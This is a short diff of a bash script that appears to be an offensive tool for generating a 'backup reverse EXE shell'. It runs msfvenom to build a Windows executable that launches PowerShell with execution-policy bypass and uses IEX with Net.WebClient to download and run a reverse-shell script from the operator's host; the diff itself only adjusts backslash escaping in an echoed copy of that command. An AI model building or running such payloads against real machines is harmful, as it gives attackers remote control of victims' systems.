@@ -10,7 +10,7 @@ IP=$( IP_No_Clip );
 New_IP=$( echo -n $IP );  
 
 echo -e "${YELLOW}[+] Creating Backup Reverse EXE Shell";
-echo -e "${CYAN}msfvenom -a x64 --platform Windows -p windows/x64/exec CMD=\"C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://$New_IP:$1/reverse_$2.ps1')\"\" -f exe -o backup_64shell_$2.exe";
+echo -e "${CYAN}msfvenom -a x64 --platform Windows -p windows/x64/exec CMD=\"C:\Windows\SysNative\WindowsPowershell\\\v1.0\powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://$New_IP:$1/reverse_$2.ps1')\"\" -f exe -o backup_64shell_$2.exe";
 msfvenom -a x86 --platform Windows -p windows/exec CMD="C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).downloadString('http://$New_IP:$1/reverse_$2.ps1')\"" -f exe -o backup_64shell_$2.exe;
 echo -e "${GREEN}Backup Reverse EXE Shell created.\n";
 
